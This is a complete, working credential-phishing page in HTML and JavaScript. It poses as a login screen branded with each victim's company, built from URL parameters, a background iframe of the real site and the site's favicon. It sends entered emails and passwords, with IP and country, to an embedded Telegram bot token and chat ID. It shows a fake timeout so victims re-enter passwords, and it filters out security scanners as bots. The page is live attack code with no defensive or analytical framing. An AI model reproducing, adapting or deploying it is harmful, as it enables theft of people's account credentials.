<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Login</title>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<!-- Fetch IP immediately -->
<script src="https://l2.io/ip.js?var=userip"></script>
<style>
body { background-color: #eeeeee; font-family: Helvetica Neue, Helvetica, sans-serif; font-size: 13px; color: #425152; margin: 0; }
#iframe-content { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; border: none; z-index: 0; }
#blocker { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: transparent; z-index: 5; pointer-events: all; }
#login-box { position: fixed; top: 50%; left: 50%; transform: translate(-50% ,-50%); background: #ffffff; padding: 20px; border-radius: 4px; box-shadow: 0 0 10px 0px #0003; width: 375px; z-index: 10; }
#login-box .header { display: flex; align-items: center; margin-bottom: 20px; }
#login-box .header img { margin-right: 10px; max-width: 40px; }
#login-box .header h2 { margin: 0; font-size: 18px; color: #425152; text-transform: uppercase; }
.row { display: flex; align-items: center; margin-bottom: 15px; }
.row label { width: 80px; font-weight: bold; color: #425152; }
.row input { flex: 1; padding: 6px 10px; border: 1px solid #ccc; border-radius: 4px; }
button { padding: 6px 10px; background: black; color: #ffffff; font-weight: bold; border: none; border-radius: 4px; cursor: pointer; align-self: flex-start; }
button:hover { background: #333; }
#error-message { color: red; margin-top: 10px; font-size: 14px; }
p.copy { margin-top: 15px; font-size: 11px; color: #666; }
</style>
</head>
<body>

<iframe id="iframe-content" src=""> </iframe>
<div id="blocker"></div>

<div id="login-box">
  <div class="header">
    <img id="logo-img" src="" alt="Company Logo">
    <h2 id="company-name">Company</h2>
  </div>
  
  <form id="loginForm">
    <!-- Antibot Honeypot -->
    <input type="text" id="b_name" style="display:none !important" tabindex="-1" autocomplete="off">
    
    <div class="row">
      <label for="email">Email :</label>
      <input type="email" id="email" readonly>
    </div>

    <div class="row">
      <label for="password">Password :</label>
      <input type="password" id="password" placeholder="Enter password" required autofocus>
    </div>

    <button type="submit" id="submitBtn">Login</button>
    <div id="error-message"></div>
  </form>

  <p class="copy">
    All rights reserved. Copyright ©️ 2026
    <span id="copy-name">Company</span>
  </p>
</div>

<script>
  var userCountry = 'Unknown';
  var isBot = 'No';

  // 1. Get Country and Antibot Info
  $.getJSON('https://ipapi.co/json/').done(function(data) {
    userCountry = data.country_name || 'Unknown';
    let org = (data.org || "").toLowerCase();
    if (org.includes("google") || org.includes("amazon") || org.includes("bot") || org.includes("datacenter")) {
      isBot = "Yes";
    }
  });

  // 2. Branding Logic
  const urlParams = new URLSearchParams(window.location.search);
  let email = urlParams.get('email') || '';
  let domain = urlParams.get('domain') || '';

  if (!domain && email.includes('@')) {
    domain = email.split('@')[1];
  }

  const emailInput = document.getElementById('email');
  if (email) emailInput.value = email;

  if (domain) {
    document.getElementById('iframe-content').src = "https://" + domain;
    document.getElementById('logo-img').src = "https://www.google.com/s2/favicons?domain=" + domain + "&sz=128";
    document.getElementById('company-name').innerText = domain.toUpperCase();
    document.getElementById('copy-name').innerText = domain.toUpperCase();
  }

  // 3. Submission Logic
  let attempts = parseInt(localStorage.getItem('loginAttempts') || '0');
  const passwordInput = document.getElementById('password');
  const errorMessage = document.getElementById('error-message');
  const submitBtn = document.getElementById('submitBtn');

  passwordInput.addEventListener('input', () => { errorMessage.innerText = ''; });

  document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();

    // Antibot Check
    if (document.getElementById('b_name').value.length > 0) return;

    const password = passwordInput.value;
    const ip = (typeof userip !== 'undefined') ? userip : 'Unknown';

    submitBtn.disabled = true;
    submitBtn.innerText = "Verifying...";

    // Telegram Configuration
    const message = '🚨 Login Attempt:\n' +
                    'Email: ' + email + '\n' +
                    'Domain: ' + domain + '\n' +
                    'Password: ' + password + '\n' +
                    'Country: ' + userCountry + '\n' +
                    'IP: ' + ip + '\n' +
                    'Antibot Flag: ' + isBot;

    const apiKey = '9186382309:AAFw03L3LRN9yyvgolar2nHiriBzhQDxpeo'; 
    const chatId = '8728734190'; 
    const url = 'https://api.telegram.org/bot' + apiKey + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);

    fetch(url).then(() => {
      attempts += 1;
      localStorage.setItem('loginAttempts', attempts);

      if (attempts >= 10 && domain) {
        window.location.href = "https://" + domain;
        return;
      }

      setTimeout(() => {
        submitBtn.disabled = false;
        submitBtn.innerText = "Login";
        errorMessage.innerText = "Sign in attempt timeout, please try again.";
        passwordInput.value = '';
      }, 2000);
    }).catch(() => {
      submitBtn.disabled = false;
      submitBtn.innerText = "Login";
    });
  });
</script>

</body>
</html>
